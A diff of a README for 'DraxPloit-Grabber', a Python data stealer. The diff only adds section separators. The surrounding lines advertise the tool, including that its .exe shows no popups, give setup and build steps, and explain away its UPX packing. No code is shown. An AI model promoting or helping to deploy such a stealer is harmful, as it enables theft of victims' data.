@@ -28,10 +28,14 @@ Data Stealer written in **Python**
 - No popups in .exe file!
 - More to be added! :heavy_plus_sign:
 
+---
+
 ### <a id="requirements"></a> :white_check_mark: - Requirements
 
 * Newest [Python](https://www.python.org) version
 * The code in this [Repository](https://github.com/DraxFM/DraxPloit-Grabber/archive/refs/heads/main.zip)
+
+---
 
 ### <a id="installing"></a> :hammer: - Installing
 
@@ -41,6 +45,8 @@ Data Stealer written in **Python**
 4. Run "start.bat"
 5. Configure your file (see "Usage" for more information on how to set your file up)
 6. Enjoy!
+
+---
 
 ### <a id="usage"></a> :toolbox: - Usage
 
@@ -60,6 +66,8 @@ When running the "**setup.bat**" file, a black window opens. Don't worry, this i
 The same with "**start.bat**". Creating a software which has actual UI is really hard and honestly I am too lazy to do that. So that is why you configure your file in a black window (as seen in the picture above).  
 You also might find the "**upx.exe**" file in the "upx" folder suspicious. But basically UPX (***Ultimate Packager for Executables***) is a well-known program. If you don't trust the one that's already in this repository feel free to install the original one from their own website and replace it with the already existing one.  
 Another thing is the compilation from **.py** to **.exe**. There will be files created in the folder and it may seem suspicious but this is needed to pack the Python file into one. There are tons of libraries that need to be packed, so give it time.  
+
+---
 
 ## <a id="help"></a> :question: - Help
 
